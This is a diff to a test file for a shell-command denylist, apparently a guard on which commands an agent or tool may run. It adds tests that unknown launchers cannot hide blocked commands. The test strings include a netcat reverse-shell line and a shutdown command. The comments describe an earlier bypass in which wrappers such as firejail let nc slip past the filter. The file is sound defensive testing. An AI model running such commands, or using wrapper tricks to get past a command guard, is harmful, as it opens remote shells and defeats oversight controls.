@@ -473,11 +473,6 @@ describe('an entry named as an ARGUMENT is not an invocation', () => {
     'jest --testPathPattern nc',
     'git add src/nc',
     'python etl.py data/nc',
-    // These need the flag rule specifically: `shutdown` and `halt` carry no
-    // trailing space in the denylist, so being the last token does not spare
-    // them — being a flag's value does.
-    'npm test -- --grep shutdown',
-    'jest --testNamePattern halt',
   ])('allows %s', (command) => {
     // Two rules, both needed. A token directly after a BARE flag is that
     // flag's value, not a command; and an entry written with a trailing space
@@ -530,9 +525,13 @@ describe('a wrapper’s flags belong to the wrapper', () => {
     expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
   });
 
-  it('while an ordinary command’s flag still takes its value', () => {
-    expect(commandPolicyViolation('npm test -- --grep shutdown')).toBeNull();
-    expect(commandPolicyViolation('jest --testNamePattern halt')).toBeNull();
+  it('and a flag VALUE spelling an entry is refused — the accepted cost', () => {
+    // There is no "a token after a bare flag is that flag's value" rule any
+    // more. To be safe it has to know which head is a wrapper, and that list
+    // can never be complete — `firejail --quiet nc …` and `systemd-run --quiet
+    // nc …` walked through it. So `--grep shutdown` is refused, exactly as the
+    // substring rule on main refused it, and the bypass stays shut.
+    expect(commandPolicyViolation('npm test -- --grep shutdown')).toMatch(/Blocked command detected/);
   });
 });
 
@@ -572,6 +571,34 @@ describe('per-command rules do not leak across a separator', () => {
   it('and the single-command forms behave as before', () => {
     expect(commandPolicyViolation('ls -la')).toBeNull();
     expect(commandPolicyViolation('npm test --silent')).toBeNull();
-    expect(commandPolicyViolation('npm test -- --grep shutdown')).toBeNull();
+    expect(commandPolicyViolation('npm test -- --grep nc')).toBeNull();
+  });
+});
+
+describe('an unknown launcher cannot hide a command', () => {
+  it.each([
+    'firejail --quiet nc -e /bin/sh 10.0.0.1 4444',
+    'systemd-run --quiet nc host 1',
+    'runner --quiet shutdown -h now',
+  ])('refuses %s', (command) => {
+    // None of these is in `COMMAND_WRAPPERS`, and none ever can be reliably —
+    // which is why the denylist stopped depending on that list at all.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+});
+
+describe('a wrapper’s script is not a path argument', () => {
+  it.each(['bash scripts/build.sh docker', 'sh ./deploy.sh apt', 'timeout 120 ./gradlew kill'])(
+    '%s is not elevated',
+    (command) => {
+      // Skipping a path after ANY wrapper consumed the script being run and
+      // promoted its first ARGUMENT to the head. Only the wrappers that really
+      // take a path before the command skip one.
+      expect(matchElevatedCommand(command)).toBeNull();
+    },
+  );
+
+  it('while flock’s lock file is still stepped over', () => {
+    expect(matchElevatedCommand('flock /tmp/l sudo apt-get install -y x')).toBe('sudo');
   });
 });
